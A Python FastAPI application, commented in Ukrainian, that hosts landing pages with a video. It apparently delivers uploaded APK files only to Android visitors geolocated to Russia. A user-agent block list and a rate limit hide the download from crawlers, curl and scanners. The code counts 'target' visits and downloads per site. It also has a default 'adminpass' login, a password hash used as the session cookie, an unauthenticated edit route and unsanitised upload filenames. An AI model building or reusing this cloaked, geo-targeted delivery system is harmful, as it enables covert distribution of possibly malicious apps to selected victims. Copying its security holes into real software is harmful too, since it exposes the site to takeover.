import os
import time

from fastapi import FastAPI, Request, Form, HTTPException, UploadFile, File, Path as FPath
from fastapi.responses import HTMLResponse, RedirectResponse, FileResponse
from fastapi.templating import Jinja2Templates

from sqlalchemy import select, insert, update, delete, text, inspect
import hashlib

from models import engine, sites_table, admins_table, init_db
import geoip2.database
import mimetypes
from fastapi import FastAPI, Request, Form, UploadFile, File, Depends

from fastapi import Form, File, UploadFile, Request
from fastapi.responses import RedirectResponse, HTMLResponse
from sqlalchemy import select, update

# --- антибот ---
BAD_AGENTS = ["bot", "crawler", "spider", "python-requests", "curl", "monitor"]
GOOD_BOTS = [
    "googlebot", "bingbot", "yandex", "duckduckbot", "slurp",
    "facebookexternalhit", "twitterbot", "applebot", "linkedinbot"
]
REQUEST_LOG = {}
RATE_LIMIT = 10

def is_good_bot(ua: str) -> bool:
    u = (ua or "").lower()
    return any(g in u for g in GOOD_BOTS)


def is_suspicious(request: Request) -> bool:
    ua = (request.headers.get("user-agent") or "").lower()
    # добрі боти — не підозрілі
    if is_good_bot(ua):
        return False
    # погані агенти
    if any(bad in ua for bad in BAD_AGENTS):
        return True
    # обмеження по кількості запитів
    ip = request.client.host if request.client else "unknown"
    now = time.time()
    REQUEST_LOG.setdefault(ip, [])
    REQUEST_LOG[ip] = [t for t in REQUEST_LOG[ip] if now - t < 60]
    REQUEST_LOG[ip].append(now)
    return len(REQUEST_LOG[ip]) > RATE_LIMIT


# ------------- init -------------
init_db()

# --- авто-додавання custom_domain у таблицю sites, якщо відсутня ---
def ensure_custom_domain_column():
    insp = inspect(engine)
    try:
        cols = [c["name"] for c in insp.get_columns("sites")]
    except Exception:
        cols = []
    if "custom_domain" not in cols:
        with engine.begin() as conn:
            conn.execute(
                text("ALTER TABLE sites ADD COLUMN custom_domain TEXT;")
            )
            print("[INIT] Додано колонку custom_domain до таблиці sites")

# --- авто-додавання downloads у таблицю sites, якщо відсутня ---
def ensure_downloads_column():
    insp = inspect(engine)
    try:
        cols = [c["name"] for c in insp.get_columns("sites")]
    except Exception:
        cols = []
    if "downloads" not in cols:
        with engine.begin() as conn:
            conn.execute(
                text("ALTER TABLE sites ADD COLUMN downloads INTEGER DEFAULT 0;")
            )
            print("[INIT] Додано колонку downloads до таблиці sites")

# --- авто-додавання target_visits у таблицю sites, якщо відсутня ---
def ensure_target_visits_column():
    insp = inspect(engine)
    try:
        cols = [c["name"] for c in insp.get_columns("sites")]
    except Exception:
        cols = []
    if "target_visits" not in cols:
        with engine.begin() as conn:
            conn.execute(
                text("ALTER TABLE sites ADD COLUMN target_visits INTEGER DEFAULT 0;")
            )
            print("[INIT] Додано колонку target_visits до таблиці sites")

# викликаємо всі ensure_* один раз ПІСЛЯ визначення функцій
ensure_custom_domain_column()
ensure_downloads_column()
ensure_target_visits_column()


app = FastAPI()
templates = Jinja2Templates(directory="templates")

# базовий домен
BASE_DOMAIN = "video-hub-z323.onrender.com"
ADMIN_HOST = BASE_DOMAIN

DEFAULT_VIDEO_URL = "https://www.facebook.com/100083217134676/videos/24845200235163725/?__so__=permalink&locale=uk_UA"
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
GEO_DB_PATH = os.path.join(BASE_DIR, "GeoLite2-Country.mmdb")

UPLOAD_DIR = "uploads"
os.makedirs(UPLOAD_DIR, exist_ok=True)


@app.get("/media/{name}")
async def serve_media(name: str):
    full_path = os.path.join(UPLOAD_DIR, name)
    if not os.path.exists(full_path):
        raise HTTPException(status_code=404, detail="File not found")

    mime, _ = mimetypes.guess_type(full_path)
    if not mime and full_path.lower().endswith((".mp4", ".webm", ".ogg")):
        mime = "video/mp4"

    # inline — не змушує качати
    return FileResponse(full_path, media_type=mime)


def hash_password(password: str) -> str:
    # простий sha256
    return hashlib.sha256(password.encode("utf-8")).hexdigest()


def verify_password(password: str, password_hash: str) -> bool:
    return hash_password(password) == password_hash


# ---------- хелпери домену ----------
def is_admin_host(host: str) -> bool:
    host = host.split(":")[0].lower()
    return host == ADMIN_HOST.lower() or host == f"www.{ADMIN_HOST}".lower()


def get_subdomain(host: str) -> str | None:
    host = host.split(":")[0]
    parts = host.split(".")
    if len(parts) < 3:
        return None
    return parts[0]


def get_country_from_ip(ip: str) -> str | None:
    if not os.path.exists(GEO_DB_PATH):
        return None
    try:
        reader = geoip2.database.Reader(GEO_DB_PATH)
        resp = reader.country(ip)
        reader.close()
        return resp.country.iso_code
    except Exception:
        return None


# створюємо дефолтного адміна, якщо нема
with engine.begin() as conn:
    row = conn.execute(
        select(admins_table).where(admins_table.c.username == "admin")
    ).fetchone()
    if not row:
        conn.execute(
            insert(admins_table).values(
                username="admin",
                password_hash=hash_password("adminpass")
            )
        )


def check_admin(request: Request):
    cookie_val = request.cookies.get("admin_auth")
    if not cookie_val:
        raise HTTPException(status_code=401)

    with engine.connect() as conn:
        row = conn.execute(
            select(admins_table).where(admins_table.c.username == "admin")
        ).fetchone()

    if not row:
        raise HTTPException(status_code=401)

    admin = dict(row._mapping)
    if cookie_val != admin["password_hash"]:
        raise HTTPException(status_code=401)


# ---------- helpers ----------
def _sanitize_domain(value: str) -> str:
    v = (value or "").strip().lower()
    if not v:
        return ""
    # remove scheme and trailing slashes
    if v.startswith("http://"):
        v = v[len("http://"):]
    elif v.startswith("https://"):
        v = v[len("https://"):]
    v = v.strip().strip("/")
    # drop leading www.
    if v.startswith("www."):
        v = v[4:]
    return v


def _generate_site_id_from_domain(domain: str) -> str:
    v = (domain or "").strip().lower()
    v = v.replace("http://", "").replace("https://", "").strip().strip("/")
    if v.startswith("www."):
        v = v[4:]
    # take first label as base id; fallback to whole sanitized
    base = v.split(".")[0] if "." in v else v
    import re
    base = re.sub(r"[^a-z0-9-]", "-", base)
    base = re.sub(r"-+", "-", base).strip("-")
    if not base:
        base = "site"
    return base[:30]  # limit length


# ---------- AUTH ----------
@app.get("/login", response_class=HTMLResponse)
async def login_page(request: Request):
    return templates.TemplateResponse("login.html", {"request": request, "error": None})


@app.post("/login")
async def login(request: Request, password: str = Form(...)):
    with engine.connect() as conn:
        row = conn.execute(
            select(admins_table).where(admins_table.c.username == "admin")
        ).fetchone()

    if not row:
        return templates.TemplateResponse(
            "login.html",
            {"request": request, "error": "Адмін не знайдений"},
        )

    admin = dict(row._mapping)

    if not verify_password(password, admin["password_hash"]):
        return templates.TemplateResponse(
            "login.html",
            {"request": request, "error": "wrong password"},
        )

    resp = RedirectResponse("/admin", status_code=303)
    # кладемо в cookie хеш
    resp.set_cookie(
        "admin_auth", admin["password_hash"],
        httponly=True, samesite="lax", secure=True
    )
    return resp


# ---------- ADMIN LIST ----------
@app.get("/admin", response_class=HTMLResponse)
async def admin_list(request: Request):
    try:
        check_admin(request)
    except HTTPException:
        return RedirectResponse("/login")

    with engine.connect() as conn:
        rows = conn.execute(select(sites_table)).fetchall()
        sites = [dict(r._mapping) for r in rows]

    return templates.TemplateResponse(
        "admin_list.html",
        {
            "request": request,
            "sites": sites,
            "base_domain": BASE_DOMAIN,
        },
    )


# ---------- CHANGE PASSWORD ----------
@app.get("/admin/change-password", response_class=HTMLResponse)
async def change_password_page(request: Request):
    try:
        check_admin(request)
    except HTTPException:
        return RedirectResponse("/login")

    return templates.TemplateResponse(
        "admin_change_password.html",
        {"request": request, "error": None, "success": None}
    )


@app.post("/admin/delete/{site_id}")
async def admin_delete(site_id: int, request: Request):
    try:
        check_admin(request)  # якщо є захист адмінки
    except HTTPException:
        return RedirectResponse("/login")

    # спочатку дістаємо рядок, щоб знати файл контенту
    with engine.begin() as conn:
        row = conn.execute(
            select(sites_table).where(sites_table.c.id == site_id)
        ).fetchone()

        if not row:
            raise HTTPException(status_code=404, detail="Site not found")

        site = dict(row._mapping)

        # видаляємо запис
        conn.execute(delete(sites_table).where(sites_table.c.id == site_id))

    # пробуємо прибрати файл, якщо існує та всередині UPLOAD_DIR
    content_name = site.get("content") or ""
    try:
        if content_name:
            file_path = os.path.join(UPLOAD_DIR, content_name)
            file_abs = os.path.abspath(file_path)
            up_dir = os.path.abspath(UPLOAD_DIR)
            # безпека: файл має бути всередині uploads
            if file_abs.startswith(up_dir) and os.path.isfile(file_abs):
                os.remove(file_abs)
    except Exception:
        pass

    return RedirectResponse(url="/admin", status_code=303)

# (Необов'язково) підтримати видалення і GET-запитом — зручно для кнопок-лінків:


@app.get("/admin/delete/{site_id}")
async def admin_delete_get(site_id: int, request: Request):
    return await admin_delete(site_id, request)


@app.post("/admin/change-password", response_class=HTMLResponse)
async def change_password_post(
    request: Request,
    old_password: str = Form(...),
    new_password: str = Form(...),
):
    try:
        check_admin(request)
    except HTTPException:
        return RedirectResponse("/login")

    with engine.begin() as conn:
        row = conn.execute(
            select(admins_table).where(admins_table.c.username == "admin")
        ).fetchone()
        if not row:
            return templates.TemplateResponse(
                "admin_change_password.html",
                {"request": request, "error": "Адмін не знайдений", "success": None},
            )

        admin = dict(row._mapping)

        if not verify_password(old_password, admin["password_hash"]):
            return templates.TemplateResponse(
                "admin_change_password.html",
                {"request": request, "error": "Старий пароль невірний", "success": None},
            )

        new_hash = hash_password(new_password)
        conn.execute(
            update(admins_table)
            .where(admins_table.c.id == admin["id"])
            .values(password_hash=new_hash)
        )

    resp = templates.TemplateResponse(
        "admin_change_password.html",
        {"request": request, "error": None, "success": "Пароль змінено!"},
    )
    resp.set_cookie("admin_auth", new_hash, httponly=True)
    return resp


# ---------- ADMIN CREATE ----------
@app.get("/admin/create", response_class=HTMLResponse)
async def admin_create_get(request: Request):
    try:
        check_admin(request)
    except HTTPException:
        return RedirectResponse("/login")

    return templates.TemplateResponse(
        "admin_create.html",
        {"request": request, "error": None, "base_domain": BASE_DOMAIN},
    )


@app.post("/admin/create")
async def admin_create_post(
    request: Request,
    title: str = Form(...),
    site_id: str = Form(""),
    video_url: str = Form(""),
    status: str = Form("new"),
    device_mode: str = Form("android"),
    ua_file: UploadFile | None = File(None),
    custom_domain: str = Form(""),
):
    try:
        check_admin(request)
    except HTTPException:
        return RedirectResponse("/login")

    final_video = video_url.strip() or DEFAULT_VIDEO_URL
    saved_path = ""

    if ua_file and ua_file.filename:
        # браузери інколи присилають щось типу "C:\\fakepath\\file.apk" – обрізаємо шлях
        original_name = ua_file.filename.rsplit("\\", 1)[-1]
        # без пробілів, без site_id на початку
        safe_name = original_name.replace(" ", "_")

        full_path = os.path.join(UPLOAD_DIR, safe_name)
        with open(full_path, "wb") as f:
            while True:
                chunk = await ua_file.read(1024 * 1024)
                if not chunk:
                    break
                f.write(chunk)

        # ⚠️ у БД зберігаємо тільки ім’я файлу
        saved_path = safe_name

    # --- Логіка вибору домену ---
    cd = _sanitize_domain(custom_domain)
    sid = (site_id or "").strip().lower()

    # якщо обидва пусті
    if not sid and not cd:
        return templates.TemplateResponse(
            "admin_create.html",
            {"request": request,
                "error": "Вкажіть або Site ID (піддомен), або Домен", "base_domain": BASE_DOMAIN},
        )

    # якщо обидва заповнені
    if sid and cd:
        return templates.TemplateResponse(
            "admin_create.html",
            {"request": request, "error": "Вкажіть лише одне поле — або Site ID, або Домен",
                "base_domain": BASE_DOMAIN},
        )

    # якщо заповнений лише домен — створюємо site_id автоматично
    if cd and not sid:
        sid = _generate_site_id_from_domain(cd)

    # нормалізація sid
    import re as _re
    sid = _re.sub(r"[^a-z0-9-]", "-", sid)
    sid = _re.sub(r"-+", "-", sid).strip("-") or "site"

    # --- Перевірки унікальності ---
    with engine.begin() as conn:
        # перевірка піддомену
        exists = conn.execute(
            select(sites_table).where(sites_table.c.site_id == sid)
        ).fetchone()
        if exists:
            return templates.TemplateResponse(
                "admin_create.html",
                {"request": request, "error": "Site ID вже зайнятий",
                    "base_domain": BASE_DOMAIN},
            )

        # перевірка домену
        if cd:
            exists_cd = conn.execute(
                text("SELECT 1 FROM sites WHERE custom_domain = :cd LIMIT 1"),
                {"cd": cd}
            ).fetchone()
            if exists_cd:
                return templates.TemplateResponse(
                    "admin_create.html",
                    {"request": request, "error": "Цей домен вже прив'язаний до іншого сайту",
                        "base_domain": BASE_DOMAIN},
                )

        # створюємо сайт
        res = conn.execute(
            insert(sites_table).values(
                site_id=sid,
                title=title,
                content=saved_path,
                visits=0,
                video_url=final_video,
                status=status,
                device_mode=device_mode,
            )
        )

        new_id = res.inserted_primary_key[0]

        # якщо користувач вказав домен — оновлюємо окремо
        if cd:
            conn.execute(
                text("UPDATE sites SET custom_domain = :cd WHERE id = :id"),
                {"cd": cd, "id": new_id}
            )

    return RedirectResponse("/admin", status_code=303)


# ---------- ADMIN EDIT ----------
@app.get("/admin/edit/{site_db_id}", response_class=HTMLResponse)
async def admin_edit_get(request: Request, site_db_id: int):
    try:
        check_admin(request)
    except HTTPException:
        return RedirectResponse("/login")

    with engine.connect() as conn:
        row = conn.execute(select(sites_table).where(
            sites_table.c.id == site_db_id)).fetchone()
    if not row:
        return HTMLResponse("Not found", status_code=404)

    site = dict(row._mapping)
    return templates.TemplateResponse(
        "admin_edit.html",
        {"request": request, "site": site, "base_domain": BASE_DOMAIN},
    )


@app.post("/admin/edit/{site_id}")
async def update_site(
    request: Request,
    site_id: int,
    title: str = Form(...),
    status: str = Form("new"),
    device_mode: str = Form("android"),
    video_url: str = Form(""),
    custom_domain: str = Form(""),
    ua_file: UploadFile | None = File(None),
):
    # sanitize
    cd = _sanitize_domain(custom_domain)
    final_video = (video_url or "").strip()

    # зчитуємо поточний сайт
    with engine.connect() as conn:
        row = conn.execute(
            select(sites_table).where(sites_table.c.id == site_id)
        ).fetchone()

    if not row:
        return templates.TemplateResponse(
            "admin_edit.html",
            {"request": request, "error": "Сайт не знайдено.",
                "site": None, "base_domain": BASE_DOMAIN},
            status_code=404,
        )

    site = dict(row._mapping)

    # готуємо значення для оновлення
    update_values = {
        "title": title,
        "status": status,
        "device_mode": device_mode,
        "video_url": final_video or site.get("video_url") or "",
        "custom_domain": cd if cd else None,
    }

    # якщо завантажили файл — збережемо і оновимо шлях
    if ua_file and ua_file.filename:
        original_name = ua_file.filename.rsplit("\\", 1)[-1]
        safe_name = original_name.replace(" ", "_")

        full_path = os.path.join(UPLOAD_DIR, safe_name)
        with open(full_path, "wb") as f:
            while True:
                chunk = await ua_file.read(1024 * 1024)
                if not chunk:
                    break
                f.write(chunk)

        # тільки ім’я файла в БД
        update_values["content"] = safe_name

    # перевірка унікальності custom_domain (щоб не був прив’язаний до іншого сайту)
    with engine.begin() as conn:
        if cd:
            conflict = conn.execute(
                select(sites_table).where(
                    (sites_table.c.custom_domain == cd) & (
                        sites_table.c.id != site_id)
                )
            ).fetchone()
            if conflict:
                # повертаємо форму з помилкою
                # щоб не втратити введені значення на формі
                site.update(update_values)
                return templates.TemplateResponse(
                    "admin_edit.html",
                    {
                        "request": request,
                        "site": site,
                        "base_domain": BASE_DOMAIN,
                        "error": "Цей домен вже прив'язаний до іншого сайту",
                    },
                    status_code=400,
                )

        # оновлюємо рядок
        conn.execute(
            update(sites_table).where(sites_table.c.id ==
                                      site_id).values(**update_values)
        )

    return RedirectResponse("/admin", status_code=303)


@app.post("/admin/edit/{site_db_id}")
async def admin_edit_post(
    request: Request,
    site_db_id: int = FPath(...),
    title: str = Form(...),
    video_url: str = Form(""),
    status: str = Form("new"),
    device_mode: str = Form("android"),
    ua_file: UploadFile | None = File(None),
    custom_domain: str = Form(""),
):
    try:
        check_admin(request)
    except HTTPException:
        return RedirectResponse("/login")

    final_video = video_url.strip() or DEFAULT_VIDEO_URL

    cd = _sanitize_domain(custom_domain)

    update_values = {
        "title": title,
        "video_url": final_video,
        "status": status,
        "device_mode": device_mode,
        "custom_domain": cd if cd else None,
    }

    if ua_file and ua_file.filename:
        ...
        original_name = ua_file.filename.rsplit("\\", 1)[-1]
        safe_name = original_name.replace(" ", "_")

        full_path = os.path.join(UPLOAD_DIR, safe_name)
        with open(full_path, "wb") as f:
            while True:
                chunk = await ua_file.read(1024 * 1024)
                if not chunk:
                    break
                f.write(chunk)

        update_values["content"] = safe_name

    with engine.begin() as conn:
        # if custom_domain provided, ensure uniqueness (not bound to another record)
        if cd:
            conflict = conn.execute(
                select(sites_table).where(
                    (sites_table.c.custom_domain == cd) & (
                        sites_table.c.id != site_db_id)
                )
            ).fetchone()
            if conflict:
                return templates.TemplateResponse(
                    "admin_edit.html",
                    {"request": request, "site": {"id": site_db_id, "title": title},
                        "base_domain": BASE_DOMAIN, "error": "Цей домен вже прив'язаний до іншого сайту"},
                )
        conn.execute(
            update(sites_table).where(sites_table.c.id ==
                                      site_db_id).values(**update_values)
        )

    return RedirectResponse("/admin", status_code=303)

# --- LOGOUT ---


@app.get("/logout")
@app.post("/logout")
async def logout():
    resp = RedirectResponse("/login", status_code=303)
    # Знімаємо адмінську куку
    resp.delete_cookie("admin_auth")
    return resp


# ---------- helpers for PUBLIC rendering ----------

def has_column(table, name: str) -> bool:
    try:
        return name in table.c  # SQLAlchemy ColumnCollection supports 'in'
    except Exception:
        return False


def get_site_by_host(conn, host: str):
    """Спочатку шукаємо сайт за повним доменом (custom_domain), потім — за піддоменом (site_id.BASE_DOMAIN)."""
    host = (host or "").split(":")[0].lower()

    # 1) кастомний домен (якщо є така колонка)
    if has_column(sites_table, "custom_domain"):
        row = conn.execute(
            select(sites_table).where(sites_table.c.custom_domain == host)
        ).fetchone()
        if row:
            return dict(row._mapping)

    # 2) схема з піддоменом
    sub = get_subdomain(host)
    if sub:
        row = conn.execute(
            select(sites_table).where(sites_table.c.site_id == sub)
        ).fetchone()
        if row:
            return dict(row._mapping)

    return None

def get_client_ip(request: Request) -> str:
    """
    Повертає IP користувача:
    1) X-Forwarded-For (якщо є)
    2) X-Real-IP (якщо є)
    3) request.client.host як fallback
    """
    xff = request.headers.get("x-forwarded-for")
    if xff:
        ip = xff.split(",")[0].strip()
    else:
        x_real = request.headers.get("x-real-ip")
        if x_real:
            ip = x_real.strip()
        else:
            ip = request.client.host

    print("DEBUG_IP:", ip)
    return ip




async def do_render(request: Request, site: dict) -> HTMLResponse | FileResponse:
    """
    Логіка:
    - фільтр по device_mode
    - визначення країни (параметр ?country=, потім GeoIP)
    - РФ + ?download=1 + є файл + не бот → віддаємо файл
    - в усіх інших випадках → рендеримо site_view.html з is_ua, is_ru, has_file
    """
    ua = (request.headers.get("user-agent") or "").lower()
    is_android = "android" in ua
    is_ios = ("iphone" in ua) or ("ipad" in ua) or ("ipod" in ua)
    is_mobile = is_android or is_ios
    is_desktop = not is_mobile

    device_mode = site.get("device_mode") or "all"

    need_block = False
    if device_mode == "android" and not is_android:
        need_block = True
    elif device_mode == "ios" and not is_ios:
        need_block = True
    elif device_mode == "desktop" and not is_desktop:
        need_block = True

    if need_block:
        return templates.TemplateResponse(
            "desktop_blocked.html",
            {"request": request},
            status_code=404,
        )

    # --------- КРАЇНА: ?country= -> GeoIP ----------
    country_param = request.query_params.get("country")
    if country_param:
        country = country_param.upper()
    else:
        try:
            xff = request.headers.get("x-forwarded-for")
            if xff:
                client_ip = xff.split(",")[0].strip()
            else:
                client_ip = request.client.host
            country = get_country_from_ip(client_ip) or "UNKNOWN"
            country = country.upper()
        except Exception:
            country = "UNKNOWN"

    is_ua = (country == "UA")
    is_ru = (country == "RU")

    # --------- ВІДЕО ----------
    video_url = site.get("video_url") or DEFAULT_VIDEO_URL

    # --------- ФАЙЛ З content (нормалізація шляху) ----------
    raw_name = site.get("content") or ""
    norm = raw_name.replace("\\", "/").strip()

    file_path = None
    if norm:
        if os.path.isabs(norm):
            file_path = norm
        elif norm.startswith(UPLOAD_DIR + "/"):
            # в БД вже "uploads/xxx"
            file_path = norm
        else:
            # в БД тільки імʼя → додаємо uploads/
            file_path = os.path.join(UPLOAD_DIR, norm)

    has_file = bool(file_path and os.path.exists(file_path))

    # --------- Рахуємо переходи з РФ ---------
    if is_ru:
        try:
            with engine.begin() as conn:
                conn.execute(
                    text(
                        "UPDATE sites "
                        "SET target_visits = COALESCE(target_visits, 0) + 1 "
                        "WHERE id = :id"
                    ),
                    {"id": site["id"]},
                )
        except Exception:
            pass

    # --------- РФ + ?download=1 + файл є + не бот → ВІДДАЄМО ФАЙЛ ----------
    if is_ru and request.query_params.get("download") == "1" and has_file and not is_suspicious(request):
        filename = os.path.basename(file_path)
        lower = filename.lower()

        if lower.endswith((".mp4", ".webm", ".ogg")):
            mime, _ = mimetypes.guess_type(file_path)
            media_type = mime or "video/mp4"
        elif lower.endswith(".apk"):
            media_type = "application/vnd.android.package-archive"
        else:
            media_type = "application/octet-stream"

        headers = {
            "Content-Type": media_type,
            "Content-Disposition": f'attachment; filename="{filename}"',
        }

        # +1 до downloads
        try:
            with engine.begin() as conn:
                conn.execute(
                    text(
                        "UPDATE sites "
                        "SET downloads = COALESCE(downloads, 0) + 1 "
                        "WHERE id = :id"
                    ),
                    {"id": site["id"]},
                )
        except Exception:
            pass

        return FileResponse(
            file_path,
            media_type=media_type,
            filename=filename,
            headers=headers,
        )

    # --------- УСІ ІНШІ → РЕНДЕР сторінки з відео ----------
    return templates.TemplateResponse(
        "site_view.html",
        {
            "request": request,
            "site": site,
            "country": country,
            "is_ua": is_ua,
            "is_ru": is_ru,
            "video_url": video_url,
            "has_file": has_file,
        },
    )



# ---------- PUBLIC ----------
@app.get("/", response_class=HTMLResponse)
async def public_entry(request: Request):
    host = (request.headers.get("host") or "").split(":")[0].lower()

    if is_admin_host(host):
        return RedirectResponse("/admin")

    with engine.begin() as conn:
        site = get_site_by_host(conn, host)
        if not site:
            return HTMLResponse("No site for this host", status_code=404)

        # 🔁 редирект, якщо є кастомний домен і ми на "рідному" піддомені
        if site.get("custom_domain") and host == f"{site['site_id']}.{BASE_DOMAIN}":
            return RedirectResponse(f"https://{site['custom_domain']}", status_code=301)

        try:
            conn.execute(
                update(sites_table)
                .where(sites_table.c.id == site["id"])
                .values(visits=(site.get("visits") or 0) + 1)
            )
        except Exception:
            pass

    return await do_render(request, site)


@app.get("/s/{site_id}", response_class=HTMLResponse)
async def public_entry_path(request: Request, site_id: str):
    """Альтернативний спосіб без піддоменів: доступ за шляхом /s/{site_id} на будь-якому домені."""
    host = (request.headers.get("host") or "").lower()
    if is_admin_host(host):
        return RedirectResponse("/admin")

    with engine.begin() as conn:
        row = conn.execute(select(sites_table).where(
            sites_table.c.site_id == site_id)).fetchone()
        if not row:
            return HTMLResponse("Not found", status_code=404)
        site = dict(row._mapping)

        try:
            conn.execute(
                update(sites_table)
                .where(sites_table.c.id == site["id"])
                .values(visits=(site.get("visits") or 0) + 1)
            )
        except Exception:
            pass

    return await do_render(request, site)
